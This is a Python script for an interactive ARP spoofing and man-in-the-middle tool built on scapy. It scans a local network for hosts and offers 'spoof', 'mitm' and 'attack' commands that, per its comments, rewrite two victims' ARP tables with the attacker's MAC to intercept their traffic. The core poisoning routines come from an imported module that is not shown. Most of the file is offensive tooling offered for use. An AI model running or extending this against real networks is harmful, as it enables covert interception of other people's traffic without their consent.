from pwn import log
from scapy.all import *
import subprocess
import threading
import sys
from tables import *


print("""


|-----------------------------------------------------------------------|
||                                                                     ||
||       _    ____  ____  ____  ____   ___   ___  _____ _____ ____     ||
||      / \  |  _ \|  _ \/ ___||  _ \ / _ \ / _ \|  ___| ____|  _ \    ||
||     / _ \ | |_) | |_) \___ \| |_) | | | | | | | |_  |  _| | |_) |   ||
||    / ___ \|  _ <|  __/ ___) |  __/| |_| | |_| |  _| | |___|  _ <    ||
||   /_/   \_|_| \_|_|   |____/|_|    \___/ \___/|_|   |_____|_| \_\   ||
||                                                                     ||
||                                                                     ||
||   By: xalvarex                                                      ||
||   Github: https://github.com/xalvarex/                              ||
||                                                                     || 
|-----------------------------------------------------------------------|


""")

host_list = []
    
arptables = {}
adapter = "Realtek PCIe GbE Family Controller"#False
    



def arp_scan(network):
    
    hosts_up = []

    conf.verb = 0

    print("Scanning network (ARP)...")
    
    up, down = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = network), timeout = 3, iface = adapter, inter = 0.1)

    for snd,rcv in up:
        IP = str(rcv).split(' ')[7]
        MAC = str(rcv).split(' ')[5]
        hosts_up.append([IP, MAC, False])
        
            
    return hosts_up
        
    



    
def show_hosts(host_list):
    
    print("|\t\tIP\t|\t\tMAC\t\t|")
    

    for host in host_list:


        IP = host[0]
        MAC = host[1]
        
        print("|\t{}\t|\t{}\t|".format(IP, MAC)) 
       

        

            
        


try:
    adapter = sys.argv[1]
except:
    print("Provide a valid adapter")


while adapter:

    msg = input("\n\n> ").split(' ')

    

    if msg[0] == "arpscan":

        host_list = arp_scan(msg[1])
     
        show_hosts(host_list)




    elif msg[0] == "hosts":
        show_hosts(host_list)
        
        


    elif msg[0] == "arptable":

        target = msg[1]
        
        if (target in arptables) == False:
            arptables[target] = arptable(target, copy.deepcopy(host_list))
            print("\n(Table generated)\n")
            
            
        arptables[target].show()
        



    elif msg[0] == "spoof":

        target = msg[1]

        if (target in arptables) == False:
            arptables[target] = arptable(target, copy.deepcopy(host_list))
            print("\n(Table generated)\n")
            
        
        arptables[target].spoof()
        

        


    elif msg[0] == "mitm":
        
        victim_ip1 = msg[1]
        victim_ip2 = msg[2]

        if (victim_ip1 in arptables) == False:
            arptables[victim_ip1] = arptable(victim_ip1, copy.deepcopy(host_list))
            print("\n(Table generated)\n")

        if (victim_ip2 in arptables) == False:
            arptables[victim_ip2] = arptable(victim_ip2, copy.deepcopy(host_list))
            print("\n(Table generated)\n")


        #modify victim1 arp table, changing victim_ip2 with attacker MAC
        arptables[victim_ip1].mitm(victim_ip2)
        
        #modify victim2 arp table, changing victim_ip1 with attacker MAC
        arptables[victim_ip2].mitm(victim_ip1)
        


        arptables[victim_ip1].show()
        arptables[victim_ip2].show()

    

    
    elif msg[0] == "attack":

        for obj in arptables:
            arptables[obj].attack()


    

    
        
   

        

        

        

        
        

        
        

        

        
        


        





    
            

